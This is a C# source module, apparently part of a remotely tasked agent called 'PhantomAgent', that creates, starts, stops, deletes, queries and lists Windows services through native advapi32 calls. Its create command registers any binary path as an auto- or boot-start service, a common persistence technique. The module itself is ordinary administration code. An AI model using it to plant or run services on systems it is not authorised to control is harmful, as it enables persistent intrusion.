using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text.Json;

namespace PhantomAgent.Modules;

public static class ServicesModule
{
    public const string Name = "services";

    public static Dictionary<string, Func<Dictionary<string, JsonElement>?, object>> GetCommands()
    {
        return new Dictionary<string, Func<Dictionary<string, JsonElement>?, object>>
        {
            ["svc_create"] = args => CreateService(
                GetString(args, "name"),
                GetString(args, "bin_path"),
                GetStringOpt(args, "display_name"),
                GetStringOpt(args, "start_type") ?? "demand"),
            ["svc_start"] = args => StartService(GetString(args, "name")),
            ["svc_stop"] = args => StopService(GetString(args, "name")),
            ["svc_delete"] = args => DeleteService(GetString(args, "name")),
            ["svc_query"] = args => QueryService(GetString(args, "name")),
            ["svc_config"] = args => QueryServiceConfig(GetString(args, "name")),
            ["svc_list"] = _ => ListServices(),
        };
    }

    private static Dictionary<string, object> CreateService(string name, string binPath,
        string? displayName, string startType)
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return new Dictionary<string, object> { ["error"] = "Windows only" };

        IntPtr hScm = NativeMethods.OpenSCManager(null, null, 0x0002); // SC_MANAGER_CREATE_SERVICE
        if (hScm == IntPtr.Zero)
            throw new UnauthorizedAccessException($"OpenSCManager failed: {Marshal.GetLastWin32Error()}");

        try
        {
            uint dwStartType = startType.ToLowerInvariant() switch
            {
                "auto" => 0x00000002,     // SERVICE_AUTO_START
                "boot" => 0x00000000,     // SERVICE_BOOT_START
                "system" => 0x00000001,   // SERVICE_SYSTEM_START
                "disabled" => 0x00000004, // SERVICE_DISABLED
                _ => 0x00000003,          // SERVICE_DEMAND_START
            };

            IntPtr hService = NativeMethods.CreateService(
                hScm,
                name,
                displayName ?? name,
                0xF01FF,    // SERVICE_ALL_ACCESS
                0x00000010, // SERVICE_WIN32_OWN_PROCESS
                dwStartType,
                0x00000001, // SERVICE_ERROR_NORMAL
                binPath,
                null, IntPtr.Zero, null, null, null);

            if (hService == IntPtr.Zero)
                throw new InvalidOperationException($"CreateService failed: {Marshal.GetLastWin32Error()}");

            NativeMethods.CloseServiceHandle(hService);

            return new Dictionary<string, object>
            {
                ["status"] = "ok",
                ["name"] = name,
                ["bin_path"] = binPath,
                ["start_type"] = startType,
            };
        }
        finally
        {
            NativeMethods.CloseServiceHandle(hScm);
        }
    }

    private static Dictionary<string, object> StartService(string name)
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return new Dictionary<string, object> { ["error"] = "Windows only" };

        IntPtr hScm = NativeMethods.OpenSCManager(null, null, 0x0001); // SC_MANAGER_CONNECT
        if (hScm == IntPtr.Zero)
            throw new UnauthorizedAccessException($"OpenSCManager failed: {Marshal.GetLastWin32Error()}");

        try
        {
            IntPtr hService = NativeMethods.OpenService(hScm, name, 0x0010); // SERVICE_START
            if (hService == IntPtr.Zero)
                throw new InvalidOperationException($"OpenService failed: {Marshal.GetLastWin32Error()}");

            try
            {
                if (!NativeMethods.StartService(hService, 0, IntPtr.Zero))
                    throw new InvalidOperationException($"StartService failed: {Marshal.GetLastWin32Error()}");

                return new Dictionary<string, object>
                {
                    ["status"] = "ok",
                    ["name"] = name,
                    ["action"] = "started",
                };
            }
            finally { NativeMethods.CloseServiceHandle(hService); }
        }
        finally { NativeMethods.CloseServiceHandle(hScm); }
    }

    private static Dictionary<string, object> StopService(string name)
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return new Dictionary<string, object> { ["error"] = "Windows only" };

        IntPtr hScm = NativeMethods.OpenSCManager(null, null, 0x0001);
        if (hScm == IntPtr.Zero)
            throw new UnauthorizedAccessException($"OpenSCManager failed: {Marshal.GetLastWin32Error()}");

        try
        {
            IntPtr hService = NativeMethods.OpenService(hScm, name, 0x0020); // SERVICE_STOP
            if (hService == IntPtr.Zero)
                throw new InvalidOperationException($"OpenService failed: {Marshal.GetLastWin32Error()}");

            try
            {
                var status = new NativeMethods.SERVICE_STATUS();
                if (!NativeMethods.ControlService(hService, 0x00000001, ref status)) // SERVICE_CONTROL_STOP
                    throw new InvalidOperationException($"ControlService(STOP) failed: {Marshal.GetLastWin32Error()}");

                return new Dictionary<string, object>
                {
                    ["status"] = "ok",
                    ["name"] = name,
                    ["action"] = "stopped",
                };
            }
            finally { NativeMethods.CloseServiceHandle(hService); }
        }
        finally { NativeMethods.CloseServiceHandle(hScm); }
    }

    private static Dictionary<string, object> DeleteService(string name)
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return new Dictionary<string, object> { ["error"] = "Windows only" };

        IntPtr hScm = NativeMethods.OpenSCManager(null, null, 0x0001);
        if (hScm == IntPtr.Zero)
            throw new UnauthorizedAccessException($"OpenSCManager failed: {Marshal.GetLastWin32Error()}");

        try
        {
            IntPtr hService = NativeMethods.OpenService(hScm, name, 0x10000); // DELETE
            if (hService == IntPtr.Zero)
                throw new InvalidOperationException($"OpenService failed: {Marshal.GetLastWin32Error()}");

            try
            {
                if (!NativeMethods.DeleteService(hService))
                    throw new InvalidOperationException($"DeleteService failed: {Marshal.GetLastWin32Error()}");

                return new Dictionary<string, object>
                {
                    ["status"] = "ok",
                    ["name"] = name,
                    ["action"] = "deleted",
                };
            }
            finally { NativeMethods.CloseServiceHandle(hService); }
        }
        finally { NativeMethods.CloseServiceHandle(hScm); }
    }

    private static Dictionary<string, object> QueryService(string name)
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return new Dictionary<string, object> { ["error"] = "Windows only" };

        try
        {
            using var svc = new ServiceController(name);
            return new Dictionary<string, object>
            {
                ["name"] = svc.ServiceName,
                ["display_name"] = svc.DisplayName,
                ["status"] = svc.Status.ToString(),
                ["type"] = svc.ServiceType.ToString(),
                ["can_stop"] = svc.CanStop,
                ["can_pause"] = svc.CanPauseAndContinue,
                ["dependent_services"] = svc.DependentServices.Select(s => s.ServiceName).ToArray(),
                ["depends_on"] = svc.ServicesDependedOn.Select(s => s.ServiceName).ToArray(),
            };
        }
        catch (InvalidOperationException ex)
        {
            throw new FileNotFoundException($"Service not found: {name}", ex);
        }
    }

    private static Dictionary<string, object> QueryServiceConfig(string name)
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return new Dictionary<string, object> { ["error"] = "Windows only" };

        IntPtr hScm = NativeMethods.OpenSCManager(null, null, 0x0001);
        if (hScm == IntPtr.Zero)
            throw new UnauthorizedAccessException($"OpenSCManager failed: {Marshal.GetLastWin32Error()}");

        try
        {
            IntPtr hService = NativeMethods.OpenService(hScm, name, 0x0001); // SERVICE_QUERY_CONFIG
            if (hService == IntPtr.Zero)
                throw new InvalidOperationException($"OpenService failed: {Marshal.GetLastWin32Error()}");

            try
            {
                // First call to get buffer size
                NativeMethods.QueryServiceConfig(hService, IntPtr.Zero, 0, out int bytesNeeded);
                IntPtr buffer = Marshal.AllocHGlobal(bytesNeeded);
                try
                {
                    if (!NativeMethods.QueryServiceConfig(hService, buffer, bytesNeeded, out _))
                        throw new InvalidOperationException($"QueryServiceConfig failed: {Marshal.GetLastWin32Error()}");

                    var cfg = Marshal.PtrToStructure<NativeMethods.QUERY_SERVICE_CONFIG>(buffer);
                    return new Dictionary<string, object>
                    {
                        ["name"] = name,
                        ["service_type"] = cfg.dwServiceType,
                        ["start_type"] = cfg.dwStartType,
                        ["error_control"] = cfg.dwErrorControl,
                        ["binary_path"] = cfg.lpBinaryPathName ?? "",
                        ["load_order_group"] = cfg.lpLoadOrderGroup ?? "",
                        ["display_name"] = cfg.lpDisplayName ?? "",
                        ["service_start_name"] = cfg.lpServiceStartName ?? "",
                    };
                }
                finally { Marshal.FreeHGlobal(buffer); }
            }
            finally { NativeMethods.CloseServiceHandle(hService); }
        }
        finally { NativeMethods.CloseServiceHandle(hScm); }
    }

    private static List<Dictionary<string, object>> ListServices()
    {
        var result = new List<Dictionary<string, object>>();
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return result;

        foreach (var svc in ServiceController.GetServices())
        {
            try
            {
                result.Add(new Dictionary<string, object>
                {
                    ["name"] = svc.ServiceName,
                    ["display_name"] = svc.DisplayName,
                    ["status"] = svc.Status.ToString(),
                    ["type"] = svc.ServiceType.ToString(),
                });
            }
            catch { }
            finally { svc.Dispose(); }
        }
        return result;
    }

    private static string GetString(Dictionary<string, JsonElement>? args, string key)
    {
        if (args == null || !args.TryGetValue(key, out var val))
            throw new ArgumentException($"Missing required argument: {key}");
        return val.GetString() ?? throw new ArgumentException($"Null value for: {key}");
    }

    private static string? GetStringOpt(Dictionary<string, JsonElement>? args, string key)
    {
        if (args == null || !args.TryGetValue(key, out var val)) return null;
        return val.GetString();
    }

    private static class NativeMethods
    {
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr OpenSCManager(string? machineName, string? databaseName, uint access);

        // lpServiceName, lpDisplayName, dwDesiredAccess, dwServiceType, dwStartType, dwErrorControl,
        // lpBinaryPathName, lpLoadOrderGroup, lpdwTagId, lpDependencies, lpServiceStartName, lpPassword
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr CreateService(IntPtr hScManager, string serviceName, string displayName,
            uint desiredAccess, uint serviceType, uint startType, uint errorControl,
            string binaryPathName, string? loadOrderGroup, IntPtr tagId, string? dependencies,
            string? startName, string? password);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr OpenService(IntPtr hScManager, string serviceName, uint access);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int numArgs, IntPtr args);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ControlService(IntPtr hService, uint control, ref SERVICE_STATUS status);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DeleteService(IntPtr hService);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseServiceHandle(IntPtr handle);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool QueryServiceConfig(IntPtr hService, IntPtr lpServiceConfig,
            int cbBufSize, out int pcbBytesNeeded);

        [StructLayout(LayoutKind.Sequential)]
        public struct SERVICE_STATUS
        {
            public uint dwServiceType;
            public uint dwCurrentState;
            public uint dwControlsAccepted;
            public uint dwWin32ExitCode;
            public uint dwServiceSpecificExitCode;
            public uint dwCheckPoint;
            public uint dwWaitHint;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct QUERY_SERVICE_CONFIG
        {
            public uint dwServiceType;
            public uint dwStartType;
            public uint dwErrorControl;
            public string? lpBinaryPathName;
            public string? lpLoadOrderGroup;
            public uint dwTagId;
            public IntPtr lpDependencies;
            public string? lpServiceStartName;
            public string? lpDisplayName;
        }
    }
}
